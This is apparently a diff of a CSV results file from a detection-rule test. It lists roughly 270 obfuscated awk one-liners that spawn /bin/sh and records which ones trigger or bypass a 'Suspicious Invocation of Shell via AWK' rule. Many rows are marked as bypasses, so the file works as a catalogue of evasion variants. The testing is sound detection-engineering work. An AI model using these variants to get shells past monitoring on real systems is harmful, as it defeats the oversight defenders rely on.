@@ -21,7 +21,6 @@ ID,Command,Log File,Result,All Detected Rules
 20,"awk 'BEGIN {system(""/bin/""sh"""")}'",Suspicious_Invocation_of_Shell_via_AWK_attack20.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 21,"awk 'BEGIN {system(""/bin"" ""/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack21.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 22,"awk 'BEGIN {system(""/bi"" ""n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack22.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-23,"awk 'BEGIN {system(""/bin/sh"" ""\n"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack23.log,Log Error (Result Not Found),
 24,"awk 'BEGIN {system(""/bin"" ""//sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack24.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 25,"awk 'BEGIN {system(""/bin/sh"" ""//"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack25.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 26,"awk 'BEGIN {system(""/bin/sh"" "" "") }'",Suspicious_Invocation_of_Shell_via_AWK_attack26.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
@@ -32,12 +31,9 @@ ID,Command,Log File,Result,All Detected Rules
 31,"awk 'BEGIN {system(""/bin/sh"" ""\t"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack31.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 32,"awk 'BEGIN {system(""/b""""in/""""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack32.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 33,"awk 'BEGIN {system(""/bin/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack33.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-34,"awk 'BEGIN {system(""/bi\nn/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack34.log,Log Error (Result Not Found),
-35,"awk 'BEGIN {system(""/bin/s\nh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack35.log,Log Error (Result Not Found),
 36,"awk 'BEGIN {system(""/b\\in\\sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack36.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 37,"awk 'BEGIN {system(""/bin/sh\x00"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack37.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 38,"awk 'BEGIN {system(""/bin/sh"" ""\r"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack38.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
-39,"awk 'BEGIN {system(""/bi\t\nn/s\rh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack39.log,Log Error (Result Not Found),
 40,"awk 'BEGIN {system(""/bin/sh"" ""\x20"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack40.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 41,"awk 'BEGIN {system(""/bin/sh"" ""#injected"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack41.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 42,"awk 'BEGIN {system(""/bin"" ""/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack42.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
@@ -112,21 +108,7 @@ ID,Command,Log File,Result,All Detected Rules
 111,awk BEGIN system(/bin/sh),Suspicious_Invocation_of_Shell_via_AWK_attack111.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 112,awk BEGIN{system(/bin/sh)},Suspicious_Invocation_of_Shell_via_AWK_attack112.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 113,"awk BEGIN system(""/bin/sh""",Suspicious_Invocation_of_Shell_via_AWK_attack113.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-114,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack114.log,Log Error (Result Not Found),
 115,"awk 'BEGIN system(""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack115.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-116,awk 'BEGIN system /bin/sh',Suspicious_Invocation_of_Shell_via_AWK_attack116.log,Log Error (Result Not Found),
-117,awk 'BEGIN {system /bin/sh}',Suspicious_Invocation_of_Shell_via_AWK_attack117.log,Log Error (Result Not Found),
-118,awk 'BEGIN {system /bin/sh}',Suspicious_Invocation_of_Shell_via_AWK_attack118.log,Log Error (Result Not Found),
-119,awk BEGIN {system /bin/sh},Suspicious_Invocation_of_Shell_via_AWK_attack119.log,Log Error (Result Not Found),
-120,awk 'BEGIN system /bin/sh',Suspicious_Invocation_of_Shell_via_AWK_attack120.log,Log Error (Result Not Found),
-121,awk BEGIN system /bin/sh,Suspicious_Invocation_of_Shell_via_AWK_attack121.log,Log Error (Result Not Found),
-122,"awk 'BEGIN{system""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack122.log,Log Error (Result Not Found),
-123,"awk BEGIN{system""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack123.log,Log Error (Result Not Found),
-124,"awk BEGIN{system ""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack124.log,Log Error (Result Not Found),
-125,"awk BEGIN system""/bin/sh""",Suspicious_Invocation_of_Shell_via_AWK_attack125.log,Log Error (Result Not Found),
-126,"awk 'BEGIN system""/bin/sh""'",Suspicious_Invocation_of_Shell_via_AWK_attack126.log,Log Error (Result Not Found),
-127,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack127.log,Log Error (Result Not Found),
-128,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack128.log,Log Error (Result Not Found),
 129,"awk 'BEGIN { system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack129.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 130,"awk BEGIN { system(""/bin/sh"") }",Suspicious_Invocation_of_Shell_via_AWK_attack130.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 131,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack131.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
@@ -138,18 +120,8 @@ ID,Command,Log File,Result,All Detected Rules
 137,"awk 'BEGIN{system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack137.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 138,"awk 'BEGIN { system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack138.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 139,"awk 'BEGIN{ system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack139.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-140,"awk 'BEGIN {system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack140.log,Log Error (Result Not Found),
-141,"awk BEGIN{system ""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack141.log,Log Error (Result Not Found),
-142,"awk BEGIN system ""/bin/sh""",Suspicious_Invocation_of_Shell_via_AWK_attack142.log,Log Error (Result Not Found),
-143,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack143.log,Log Error (Result Not Found),
-144,"awk 'BEGIN system ""/bin/sh""'",Suspicious_Invocation_of_Shell_via_AWK_attack144.log,Log Error (Result Not Found),
-145,"awk 'BEGIN {system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack145.log,Log Error (Result Not Found),
 146,"awk 'BEGIN system(""/bin/sh"")'",Suspicious_Invocation_of_Shell_via_AWK_attack146.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 147,"awk BEGIN system(""/bin/sh"")",Suspicious_Invocation_of_Shell_via_AWK_attack147.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-148,awk 'BEGIN system /bin/sh',Suspicious_Invocation_of_Shell_via_AWK_attack148.log,Log Error (Result Not Found),
-149,awk BEGIN system /bin/sh,Suspicious_Invocation_of_Shell_via_AWK_attack149.log,Log Error (Result Not Found),
-150,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack150.log,Log Error (Result Not Found),
-151,"awk BEGIN{system ""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack151.log,Log Error (Result Not Found),
 152,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack152.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 153,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack153.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 154,"'BEGIN {system(""/bin/sh"")}' awk",Suspicious_Invocation_of_Shell_via_AWK_attack154.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
@@ -163,7 +135,6 @@ ID,Command,Log File,Result,All Detected Rules
 162,"cat /dev/null | awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack162.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 163,"awk <<< 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack163.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 164,"true | awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack164.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
-165,"awk 'BEGIN {""/bin/sh"" | getline x; close(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack165.log,Log Error (Result Not Found),
 166,"awk <<<BEGIN'{system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack166.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 167,"awk<<<'BEGIN{system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack167.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 168,":|awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack168.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
@@ -183,19 +154,16 @@ ID,Command,Log File,Result,All Detected Rules
 182,"awk 'BEGIN {s=""sh""; system(""/bin/""s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack182.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 183,"awk 'BEGIN {s=""/""; t=""bin""; u=""sh""; system(s t ""/"" u)}'",Suspicious_Invocation_of_Shell_via_AWK_attack183.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 184,"awk 'BEGIN {s=""/bin/sh""; system(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack184.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-185,"awk 'BEGIN {c=""system""; c(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack185.log,Log Error (Result Not Found),
 186,"awk 'BEGIN {a=""/bin""; b=""/sh""; system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack186.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 187,"awk 'BEGIN {cmd=""/bin/sh""; system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack187.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 188,"awk 'BEGIN {system(""/bin/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack188.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 189,"awk 'BEGIN {system(sprintf(""%s"",""/bin/sh""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack189.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 190,"awk 'BEGIN {system(""/bin/sh"" ""\x00"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack190.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
-191,"awk 'BEGIN {sys=system; sys(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack191.log,Log Error (Result Not Found),
 192,"awk 'BEGIN {if(1) system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack192.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 193,"awk 'BEGIN {while(!system(""/bin/sh"")) break}'",Suspicious_Invocation_of_Shell_via_AWK_attack193.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 194,"awk 'BEGIN {exit system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack194.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 195,"awk 'BEGIN {for(i=0;i<1;i++) system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack195.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 196,"awk 'BEGIN {a=""/bin/"";b=""sh"";system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack196.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-197,"awk 'BEGIN {s=""/bin/sh"";x=system;x(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack197.log,Log Error (Result Not Found),
 198,"awk 'BEGIN {system(""/bin/sh"");exit}'",Suspicious_Invocation_of_Shell_via_AWK_attack198.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 199,"awk 'BEGIN {s=""/bin/sh"";while(1) {system(s);break}}'",Suspicious_Invocation_of_Shell_via_AWK_attack199.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 200,"awk 'BEGIN {s=""/bin/sh"";system(s);}'",Suspicious_Invocation_of_Shell_via_AWK_attack200.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
@@ -225,17 +193,14 @@ ID,Command,Log File,Result,All Detected Rules
 224,"awk 'BEGIN{system(""/bin/sh""/*noop*/)}'",Suspicious_Invocation_of_Shell_via_AWK_attack224.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 225,"awk 'BEGIN{system(""/bin//sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack225.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 226,"awk 'BEGIN{system(""/bi/../bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack226.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-227,"awk 'BEGIN{system(""/bin/sh"" ORS)}'",Suspicious_Invocation_of_Shell_via_AWK_attack227.log,Log Error (Result Not Found),
 228,"awk 'BEGIN{system(""/bin/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack228.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 229,"awk 'BEGIN{system(""/bin"" sprintf(""%s"", ""/sh""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack229.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 230,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd FS """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack230.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 231,"awk 'BEGIN{system(""/bi"" ""n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack231.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 232,"awk 'BEGIN{system(""/bi""""n/""""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack232.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 233,"awk 'BEGIN{system(""/bin/sh\x00"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack233.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-234,"awk 'BEGIN{system(""/bin/sh"" ""\n"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack234.log,Log Error (Result Not Found),
 235,"awk 'BEGIN{system(""/bin/"" ""sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack235.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 236,"awk 'BEGIN{system(""/bin/"" tolower(""SH""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack236.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-237,"awk 'BEGIN{cmd=""/bin/sh""; print cmd |& ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack237.log,Log Error (Result Not Found),
 238,"awk 'BEGIN{system(ENVIRON[""SHELL""])}'",Suspicious_Invocation_of_Shell_via_AWK_attack238.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 239,"awk 'BEGIN{sys=""/bin/sh""; system(sys)}'",Suspicious_Invocation_of_Shell_via_AWK_attack239.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 240,"awk 'BEGIN{a=""/bin"";b=""/sh"";system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack240.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
@@ -244,41 +209,39 @@ ID,Command,Log File,Result,All Detected Rules
 243,"awk 'BEGIN{system(""/bin/sh\t"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack243.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 244,"awk 'BEGIN{cmd=""/bin/sh""; if(length(cmd)) system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack244.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 245,"awk 'BEGIN{if(1){system(""/bin/sh"")}}'",Suspicious_Invocation_of_Shell_via_AWK_attack245.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-246,"awk 'BEGIN{(system)(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack246.log,Log Error (Result Not Found),
 247,"awk 'BEGIN{system(""/b"" ""in"" ""/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack247.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 248,"awk 'BEGIN{system(""/bin"" ""/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack248.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 249,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack249.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 250,"awk 'BEGIN{system(""/bin/sh\072"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack250.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-251,"awk 'BEGIN{system(""/bin/sh\012"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack251.log,Log Error (Result Not Found),
-252,"cp $(which awk) /tmp/t; /tmp/t 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack252.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-253,"cp /usr/bin/awk /tmp/x; /tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack253.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+252,"cp $(which awk) /tmp/t; /tmp/t 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack252.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+253,"cp /usr/bin/awk /tmp/x; /tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack253.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 254,"cp /bin/awk ./a; ./a 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack254.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-255,"install /usr/bin/awk /tmp/b; /tmp/b 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack255.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-256,"ln /bin/awk /tmp/h; /tmp/h 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack256.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+255,"install /usr/bin/awk /tmp/b; /tmp/b 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack255.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+256,"ln /bin/awk /tmp/h; /tmp/h 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack256.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Execution Of Script Located In Potentially Suspicious Directory | Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 257,"ln -s $(which awk) ./j; ./j 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack257.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 258,"cp $(command -v awk) ./q; ./q 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack258.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-259,"cp $(which gawk) /tmp/a1; /tmp/a1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack259.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-260,"cp /usr/bin/gawk /tmp/a2; /tmp/a2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack260.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+259,"cp $(which gawk) /tmp/a1; /tmp/a1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack259.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+260,"cp /usr/bin/gawk /tmp/a2; /tmp/a2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack260.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 261,"cp /bin/gawk ./a3; ./a3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack261.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-262,"install /usr/bin/gawk /tmp/a4; /tmp/a4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack262.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-263,"ln /bin/gawk /tmp/a5; /tmp/a5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack263.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+262,"install /usr/bin/gawk /tmp/a4; /tmp/a4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack262.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+263,"ln /bin/gawk /tmp/a5; /tmp/a5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack263.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 264,"cp $(command -v gawk) ./a6; ./a6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack264.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-265,"cp $(which mawk) /tmp/m1; /tmp/m1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack265.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-266,"cp /usr/bin/mawk /tmp/m2; /tmp/m2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack266.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+265,"cp $(which mawk) /tmp/m1; /tmp/m1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack265.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+266,"cp /usr/bin/mawk /tmp/m2; /tmp/m2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack266.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 267,"cp /bin/mawk ./m3; ./m3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack267.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-268,"install /usr/bin/mawk /tmp/m4; /tmp/m4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack268.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-269,"ln /bin/mawk /tmp/m5; /tmp/m5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack269.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+268,"install /usr/bin/mawk /tmp/m4; /tmp/m4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack268.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+269,"ln /bin/mawk /tmp/m5; /tmp/m5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack269.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 270,"cp $(command -v mawk) ./m6; ./m6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack270.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-271,"cp $(which nawk) /tmp/n1; /tmp/n1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack271.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
